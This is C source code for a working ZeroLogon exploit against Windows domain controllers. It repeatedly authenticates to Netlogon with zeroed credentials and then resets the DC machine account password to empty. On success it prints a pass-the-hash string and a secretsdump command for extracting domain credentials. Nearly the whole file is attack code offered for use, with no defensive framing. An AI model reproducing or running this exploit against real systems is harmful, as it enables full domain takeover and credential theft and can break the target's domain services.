#include <windows.h>
#include <stdio.h>
#include <dsgetdc.h>

typedef struct _NETLOGON_CREDENTIAL {
    CHAR data[8];
} NETLOGON_CREDENTIAL, * PNETLOGON_CREDENTIAL;

typedef struct _NETLOGON_AUTHENTICATOR {
    NETLOGON_CREDENTIAL Credential;
    DWORD Timestamp;
} NETLOGON_AUTHENTICATOR, * PNETLOGON_AUTHENTICATOR;

typedef enum _NETLOGON_SECURE_CHANNEL_TYPE {
    NullSecureChannel = 0,
    MsvApSecureChannel = 1,
    WorkstationSecureChannel = 2,
    TrustedDnsDomainSecureChannel = 3,
    TrustedDomainSecureChannel = 4,
    UasServerSecureChannel = 5,
    ServerSecureChannel = 6,
    CdcServerSecureChannel = 7
} NETLOGON_SECURE_CHANNEL_TYPE;

typedef struct _NL_TRUST_PASSWORD {
    WCHAR Buffer[256];
    ULONG Length;
} NL_TRUST_PASSWORD, * PNL_TRUST_PASSWORD;

typedef NTSTATUS(WINAPI* FUNC_I_NetServerReqChallenge)(
    LPWSTR PrimaryName,
    LPWSTR ComputerName,
    PNETLOGON_CREDENTIAL ClientChallenge,
    PNETLOGON_CREDENTIAL ServerChallenge
    );

typedef NTSTATUS(WINAPI* FUNC_I_NetServerAuthenticate2)(
    LPWSTR PrimaryName,
    LPWSTR AccountName,
    NETLOGON_SECURE_CHANNEL_TYPE AccountType,
    LPWSTR ComputerName,
    PNETLOGON_CREDENTIAL ClientCredential,
    PNETLOGON_CREDENTIAL ServerCredential,
    PULONG NegotiatedFlags
    );

typedef NTSTATUS(WINAPI* FUNC_I_NetServerPasswordSet2)(
    LPWSTR PrimaryName,
    LPWSTR AccountName,
    NETLOGON_SECURE_CHANNEL_TYPE AccountType,
    LPWSTR ComputerName,
    PNETLOGON_AUTHENTICATOR Authenticator,
    PNETLOGON_AUTHENTICATOR ReturnAuthenticator,
    PNL_TRUST_PASSWORD ClearNewPassword
    );

int wmain(int argc, wchar_t* argv[], wchar_t* envp[]) {
    if (argc < 4) {
        wprintf(L"[+] Usage: %s <FQDN> <NETBIOS_NAME> <ACCOUNT_NAME>\n", argv[0]);
        wprintf(L"[+] Example: %s DC.corp.acme.com DC DC$\n", argv[0]);
        return 1;
    }

    const wchar_t* dc_fqdn = argv[1];
    const wchar_t* dc_netbios = argv[2];
    const wchar_t* dc_account = argv[3];

    wprintf(L"[+] Targeting Domain Controller:\n");
    wprintf(L"    FQDN           : %s\n", dc_fqdn);
    wprintf(L"    NetBIOS Name   : %s\n", dc_netbios);
    wprintf(L"    Machine Account: %s\n", dc_account);

    // netapi32.dll
    HMODULE hNetAPI = LoadLibraryW(L"netapi32.dll");
    if (hNetAPI == NULL) {
        wprintf(L"[!] Failed to load netapi32.dll (Error: %lu)\n", GetLastError());
        return 1;
    }

    FUNC_I_NetServerReqChallenge pI_NetServerReqChallenge =
        (FUNC_I_NetServerReqChallenge)GetProcAddress(hNetAPI, "I_NetServerReqChallenge");
    FUNC_I_NetServerAuthenticate2 pI_NetServerAuthenticate2 =
        (FUNC_I_NetServerAuthenticate2)GetProcAddress(hNetAPI, "I_NetServerAuthenticate2");
    FUNC_I_NetServerPasswordSet2 pI_NetServerPasswordSet2 =
        (FUNC_I_NetServerPasswordSet2)GetProcAddress(hNetAPI, "I_NetServerPasswordSet2");

    if (!pI_NetServerReqChallenge || !pI_NetServerAuthenticate2 || !pI_NetServerPasswordSet2) {
        wprintf(L"[!] Missing required NetAPI32 functions.\n");
        FreeLibrary(hNetAPI);
        return 1;
    }

    ULONG negotiateFlags = 0x212FFFFF; // Known good flags from ZeroLogon PoC

    // ZeroLogon attack: Null credential
    for (DWORD attempt = 0; attempt < 2000; ++attempt) {
        NETLOGON_CREDENTIAL clientChallenge = { 0 }; // always 0
        NETLOGON_CREDENTIAL serverChallenge = { 0 };

        NTSTATUS status = pI_NetServerReqChallenge(
            (LPWSTR)dc_fqdn,
            (LPWSTR)dc_netbios,
            &clientChallenge,
            &serverChallenge
        );

        if (status != 0) {
            continue; // skip
        }

        status = pI_NetServerAuthenticate2(
            (LPWSTR)dc_fqdn,
            (LPWSTR)dc_account,
            ServerSecureChannel,
            (LPWSTR)dc_netbios,
            &clientChallenge,
            &serverChallenge,
            &negotiateFlags
        );

        if (status == 0) {
            // Verification successful → Reset password
            NETLOGON_AUTHENTICATOR authenticator = { 0 };
            NETLOGON_AUTHENTICATOR returnAuthenticator = { 0 };
            NL_TRUST_PASSWORD newPassword = { 0 }; // Empty password = null hash

            status = pI_NetServerPasswordSet2(
                (LPWSTR)dc_fqdn,
                (LPWSTR)dc_account,
                ServerSecureChannel,
                (LPWSTR)dc_netbios,
                &authenticator,
                &returnAuthenticator,
                &newPassword
            );

            if (status == 0) {
                wprintf(L"\n[+] SUCCESS: Machine account password reset to empty!\n");
                wprintf(L"[+] Now use Pass-the-Hash with:\n");
                wprintf(L"      .\\%s:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0\n", dc_account);
                wprintf(L"[+] Then run: secretsdump.py -just-dc <domain>/<dc_account>@<dc_ip>\n");
                FreeLibrary(hNetAPI);
                return 0;
            }
            else {
                wprintf(L"[-] Failed to reset password (NTSTATUS: 0x%08lx)\n", status);
                FreeLibrary(hNetAPI);
                return 1;
            }
        }
    }

    wprintf(L"[-] Attack failed after 2000 attempts. Target likely patched.\n");
    FreeLibrary(hNetAPI);
    return 1;
}